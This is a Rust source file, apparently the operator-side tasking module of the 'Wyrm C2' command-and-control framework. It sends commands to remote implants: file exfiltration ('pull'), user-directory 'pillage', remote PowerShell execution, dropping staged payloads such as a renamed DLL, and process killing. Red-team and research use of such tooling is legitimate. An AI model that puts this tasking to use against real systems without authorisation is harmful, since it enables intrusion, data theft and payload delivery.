use std::{mem::take, sync::Arc};

use axum::extract::State;
use chrono::{DateTime, Utc};
use shared::{
    pretty_print::{print_failed, print_success},
    tasks::{AdminCommand, FileDropMetadata},
};
use thiserror::Error;

use crate::{
    models::{AppState, TabConsoleMessages},
    net::{ApiError, Credentials, IsTaskingAgent, IsTaskingAgentErr, api_request},
};

#[derive(Debug, Error)]
pub enum TaskDispatchError {
    #[error("API Error {0}.")]
    Api(#[from] ApiError),
    #[error("Bad tokens in input {0}")]
    BadTokens(String),
    #[error("Agent ID not present in task dispatch")]
    AgentIdMissing(#[from] IsTaskingAgentErr),
    #[error("Failed to deserialise data. {0}")]
    DeserialisationError(#[from] serde_json::Error),
}

pub async fn list_processes(
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    let _ = api_request(AdminCommand::ListProcesses, agent, creds).await?;

    Ok(())
}

pub async fn change_directory(
    new_dir: &[&str],
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    let new_dir = new_dir.join(" ").trim().to_string();

    api_request(AdminCommand::Cd(new_dir), agent, creds).await?;

    Ok(())
}

pub async fn kill_agent(
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    api_request(AdminCommand::KillAgent, agent, creds).await?;

    if let IsTaskingAgent::Yes(agent_id) = agent {
        {
            let mut agents_lock = state.connected_agents.write().await;
            agents_lock.retain(|a| a.agent_id != agent_id.as_str());
        }
        {
            let mut lock = state.active_tabs.write().await;
            let pos = lock.1.iter().position(|a| a == *agent_id);
            if let Some(pos) = pos {
                // Do not remove index 0
                if pos > 0 {
                    lock.1.remove(pos);
                    lock.0 = lock.0.saturating_sub(1);
                }
            }
        }
    }
    Ok(())
}

pub async fn kill_process(
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
    pid: &&str,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    // Validate, even through we pass a String - check it client side
    let pid_as_int: i32 = pid.parse().unwrap_or(0);
    if pid.is_empty() || pid_as_int == 0 {
        return Err(TaskDispatchError::BadTokens(
            "No pid or non-numeric supplied.".into(),
        ));
    }

    api_request(AdminCommand::KillProcessById(pid.to_string()), agent, creds).await?;

    Ok(())
}

/// Dispatching function for instructing the agent to copy a file.
///
/// # Args
/// - `from`: Where to copy from
/// - `to`: Where to copy to`
pub async fn copy_file(
    raw_input: String,
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    let (from, to) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop) {
        Some(mut inner) => {
            let from = take(&mut inner[0]);
            let to = take(&mut inner[1]);
            (from, to)
        }
        None => {
            return Err(TaskDispatchError::BadTokens(
                "Could not get data from tokens in copy_file.".into(),
            ));
        }
    };

    api_request(AdminCommand::Copy((from, to)), agent, creds).await?;

    Ok(())
}

/// Dispatching function for instructing the agent to copy a file.
///
/// # Args
/// - `from`: Where to copy from
/// - `to`: Where to copy to`
pub async fn move_file(
    raw_input: String,
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;
    let (from, to) = match split_string_slices_to_n(2, &raw_input, DiscardFirst::Chop) {
        Some(mut inner) => {
            let from = take(&mut inner[0]);
            let to = take(&mut inner[1]);
            (from, to)
        }
        None => {
            return Err(TaskDispatchError::BadTokens(
                "Could not get data from tokens in move_file.".into(),
            ));
        }
    };

    api_request(
        AdminCommand::Move((from.to_string(), to.to_string())),
        agent,
        creds,
    )
    .await?;

    Ok(())
}

/// Pull a single file from the target machine
pub async fn pull_file(
    target: String,
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    if target.is_empty() {
        print_failed(format!("Please specify a target file."));
    }

    let target = match split_string_slices_to_n(1, &target, DiscardFirst::Chop) {
        Some(mut inner) => take(&mut inner[0]),
        None => {
            return Err(TaskDispatchError::BadTokens(
                "Could not get data from tokens in pull_file.".into(),
            ));
        }
    };

    api_request(AdminCommand::Pull(target.to_string()), agent, creds).await?;

    Ok(())
}

pub async fn remove_agent(
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;
    api_request(AdminCommand::RemoveAgentFromList, &agent, creds).await?;

    // Remove agent from connected_agents
    if let IsTaskingAgent::Yes(agent_id) = agent {
        let mut agents_lock = state.connected_agents.write().await;
        agents_lock.retain(|a| a.agent_id != agent_id.as_str());
        // Remove tab
        let mut lock = state.active_tabs.write().await;
        let pos = lock.1.iter().position(|a| a == *agent_id);
        if let Some(pos) = pos {
            // Do not remove index 0
            if pos > 0 {
                lock.1.remove(pos);
                lock.0 = lock.0.saturating_sub(1);
            }
        }
    }
    Ok(())
}

pub fn exit() {
    print_success("Thank you for using Wyrm C2!");
    std::process::exit(0);
}

pub fn unknown_command() -> Result<(), TaskDispatchError> {
    print_failed(
        "Unknown command or you did not supply the correct number of arguments. Type \"help {command}\" \
        to see the instructions for that command.",
    );

    Err(TaskDispatchError::BadTokens("Unknown command or you did not supply the correct number of arguments. Type \"help {command}\" \
            to see the instructions for that command.".into()))
}

pub async fn set_sleep(
    sleep_time: &str,
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    let sleep_time: i64 = match sleep_time.parse() {
        Ok(s) => s,
        Err(e) => {
            return Err(TaskDispatchError::BadTokens(format!(
                "Could not parse new sleep time. {e}"
            )));
        }
    };

    // As on the C2 we need the sleep time to be an i64, but the implant needs it to be a u64,
    // we want to make sure we aren't going to get any overflow behaviour which could lead to
    // denial of service or other errors. We check the input number is not less than or = to 0.
    // We do not need to check the upper bound because an i64 MAX will fit into a u64.
    if sleep_time <= 0 {
        return Err(TaskDispatchError::BadTokens(
            "Sleep time must be greater than 1 (second)".into(),
        ));
    }

    api_request(AdminCommand::Sleep(sleep_time), agent, creds).await?;

    Ok(())
}

/// Clears the terminal of the selected tab / agent for the operator. This does not clear the database.
pub async fn clear_terminal(
    agent: &IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    if let IsTaskingAgent::Yes(agent_id) = agent {
        let mut lock = state.connected_agents.write().await;

        if let Some(agent_obj) = lock
            .iter_mut()
            .find(|a: &&mut crate::models::Agent| a.agent_id == **agent_id)
        {
            agent_obj.output_messages.clear();
        }
    }

    Ok(())
}

pub async fn pwd(creds: &Credentials, agent: &IsTaskingAgent<'_>) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    api_request(AdminCommand::Pwd, agent, creds).await?;

    Ok(())
}

pub async fn dir_listing(
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    api_request(AdminCommand::Ls, agent, creds).await?;

    Ok(())
}

pub async fn show_server_time(
    creds: &Credentials,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    let result = api_request(AdminCommand::ShowServerTime, &IsTaskingAgent::No, creds).await?;

    let deserialised_response: DateTime<Utc> = serde_json::from_slice(&result)?;

    let mut lock = state.connected_agents.write().await;

    if let Some(server_tab) = lock.get_mut(0) {
        server_tab
            .output_messages
            .push(TabConsoleMessages::non_agent_message(
                "ServerTime".into(),
                deserialised_response.to_string(),
            ));
    }

    Ok(())
}

pub async fn pillage(
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    api_request(AdminCommand::ListUsersDirs, agent, creds).await?;

    Ok(())
}

/// Show the help menu to the user
pub async fn show_help(
    agent: &IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
) -> Result<(), TaskDispatchError> {
    let messages: Vec<String> = vec![
        "help [command]".into(),
        "exit (Exit's the client)".into(),
        "servertime (Shows the local time of the server)".into(),
        "n (Gets new notifications for the agent)".into(),
        "kill_agent (terminates the agent on the endpoint)".into(),
        "remove_agent (removes the agent from the interface; until it reconnects)".into(),
        "cls | clear (clears the terminal)".into(),
        "".into(),
        "set sleep [time SECONDS]".into(),
        "ps".into(),
        "cd [relative path | absolute path]".into(),
        "pwd".into(),
        "ls".into(),
        "cp <from> <to> | copy <from> <to> (accepts relative or absolute paths)".into(),
        "mv <from> <to> | move <from> <to> (accepts relative or absolute paths)".into(),
        "pull <path> (Exfiltrates a file to the C2. For more info, type help pull.)".into(),
        "pillage".into(),
        "run".into(),
        "kill <pid>".into(),
        "drop <server recognised name> <filename to drop on disk (including extension)>".into(),
    ];

    if let IsTaskingAgent::Yes(agent_id) = agent {
        let mut lock = state.connected_agents.write().await;

        if let Some(agent_obj) = lock
            .iter_mut()
            .find(|a: &&mut crate::models::Agent| a.agent_id == **agent_id)
        {
            agent_obj.output_messages.push(TabConsoleMessages {
                event: "HelpMenu".into(),
                time: "-".into(),
                messages,
            });
        }
    }

    Ok(())
}

/// Shows help for a specified command where further details are available
pub async fn show_help_for_command(
    agent: &IsTaskingAgent<'_>,
    state: State<Arc<AppState>>,
    command: &str,
) -> Result<(), TaskDispatchError> {
    let messages: Vec<String> = match command {
        "drop" => vec![
            "Drops a file to disk. The file dropped must be staged on the C2 first, otherwise the process will not complete.".into(),
            "This command will drop the payload into the CURRENT working directory of the agent.".into(),
            "Arg1: The colloquial server name for the file you are dropping (appears in the Staged Resources panel as the 'Name' column)".into(),
            "Arg2: The destination filename of what you want to drop, if you want this file to have an extension, you must included that.".into(),
            "          For example, if dropping a DLL staged as my_dll, you may wish to do: drop my_dll version.dll, which will save the DLL as version.dll on disk.".into(),
        ],
        "pull" => vec![
            "Usage: pull <file path>".into(),
            "Exfiltrates a file to the C2 by its file path, which can be relative or absolute. This will upload the file to the".into(),
            "C2 and save it under: c2/<target hostname>/<file path as per targets full path>.".into(),
            "If a file already exists at that location, it will be overwritten. Note, using `pull` will cause the file to be read into memory".into(),
            "on the target machine in full, thus you should only use this on files which are smaller than the amount of available RAM on the machine.".into(),
            "Streamed `pull` is coming in a future release.".into(),
        ],
        _ => vec!["No help pages available for this command, or it does not exist.".into()],
    };

    if let IsTaskingAgent::Yes(agent_id) = agent {
        let mut lock = state.connected_agents.write().await;

        if let Some(agent_obj) = lock
            .iter_mut()
            .find(|a: &&mut crate::models::Agent| a.agent_id == **agent_id)
        {
            agent_obj.output_messages.push(TabConsoleMessages {
                event: "HelpMenu".into(),
                time: "-".into(),
                messages,
            });
        }
    }

    Ok(())
}

pub async fn run_powershell_command(
    args: &[&str],
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    let mut args_string: String = String::new();
    for arg in args {
        args_string += arg;
        args_string += " ";
    }

    let args_trimmed = args_string.trim().to_string();

    api_request(AdminCommand::Run(args_trimmed), agent, creds).await?;

    Ok(())
}

/// Instructs the agent to drop a staged file onto disk on the target endpoint.
pub async fn file_dropper(
    args: &[&str],
    creds: &Credentials,
    agent: &IsTaskingAgent<'_>,
) -> Result<(), TaskDispatchError> {
    agent.has_agent_id()?;

    if args.len() != 2 {
        return Err(TaskDispatchError::BadTokens(
            "Invalid number of args passed into the `drop` command.".into(),
        ));
    }

    let file_data = unsafe {
        FileDropMetadata {
            internal_name: args.get_unchecked(0).to_string(),
            download_name: args.get_unchecked(1).to_string(),
            // This is computed on the C2
            download_uri: None,
        }
    };

    api_request(AdminCommand::Drop(file_data), agent, creds).await?;

    Ok(())
}

/// Determines whether the [`split_string_slices_to_n`] function should discard the first
/// found substring or not - this would be useful where the command is present in the input
/// string.
#[derive(PartialEq, Eq)]
enum DiscardFirst {
    Chop,
    DontChop,
}

/// Splits a string into exactly `n` chunks, treating quoted substrings as single tokens.
/// Optionally discards the first token, which is useful if the input string begins with a command.
///
/// # Args
/// * `n` - The expected number of resulting tokens.  
/// * `strs` - The input string slice to be tokenised.  
/// * `discard_first` - Whether the first discovered token should be discarded (`Chop`) or kept (`DontChop`).  
///
/// # Returns
/// Returns `Some(Vec<String>)` if exactly `n` tokens are produced after processing,  
/// otherwise returns `None`.
///
/// # Example
/// ```
/// let s = "a b  \"c d\" e".to_string();
/// assert_eq!(
///     split_string_slices_to_n(4, &s, DiscardFirst::DontChop),
///     Some(vec![
///         "a".to_string(),
///         "b".to_string(),
///         "c d".to_string(),
///         "e".to_string(),
///     ])
/// )
/// ```
fn split_string_slices_to_n(
    n: usize,
    strs: &str,
    mut discard_first: DiscardFirst,
) -> Option<Vec<String>> {
    // Flatten the slices
    let mut chunks: Vec<String> = Vec::new();
    let mut s = String::new();
    let mut toggle: bool = false;

    for (_, c) in strs.chars().enumerate() {
        if c == '"' {
            if toggle {
                toggle = false;
                if !s.is_empty() {
                    chunks.push(take(&mut s));
                }
                s.clear();
            } else {
                // Start of a quoted string
                toggle = true;
            }
        } else if c == ' ' && !toggle {
            if discard_first == DiscardFirst::Chop && chunks.is_empty() {
                discard_first = DiscardFirst::DontChop;
                s.clear();
            }

            if !s.is_empty() {
                chunks.push(take(&mut s));
            }
            s.clear();
        } else {
            s.push(c);
        }
    }

    // Handle the very last chunk which didn't get pushed by the loop
    if !s.is_empty() {
        chunks.push(s);
    }

    if chunks.len() != n {
        return None;
    }

    Some(chunks)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tokens_with_no_quotes() {
        let s = "a b  c d e f    g    ".to_string();
        assert_eq!(
            split_string_slices_to_n(7, &s, DiscardFirst::DontChop),
            Some(vec![
                "a".to_string(),
                "b".to_string(),
                "c".to_string(),
                "d".to_string(),
                "e".to_string(),
                "f".to_string(),
                "g".to_string()
            ])
        )
    }

    #[test]
    fn tokens_with_quotes_space() {
        let s = "a b  \"c  d\" e".to_string();
        assert_eq!(
            split_string_slices_to_n(4, &s, DiscardFirst::DontChop),
            Some(vec![
                "a".to_string(),
                "b".to_string(),
                "c  d".to_string(),
                "e".to_string(),
            ])
        )
    }

    #[test]
    fn tokens_with_quotes() {
        let s = "a b  \"c d\" e".to_string();
        assert_eq!(
            split_string_slices_to_n(4, &s, DiscardFirst::DontChop),
            Some(vec![
                "a".to_string(),
                "b".to_string(),
                "c d".to_string(),
                "e".to_string(),
            ])
        )
    }

    #[test]
    fn tokens_bad_count() {
        let s = "a b  \"c d\" e".to_string();
        assert_eq!(
            split_string_slices_to_n(5, &s, DiscardFirst::DontChop),
            None
        )
    }
}
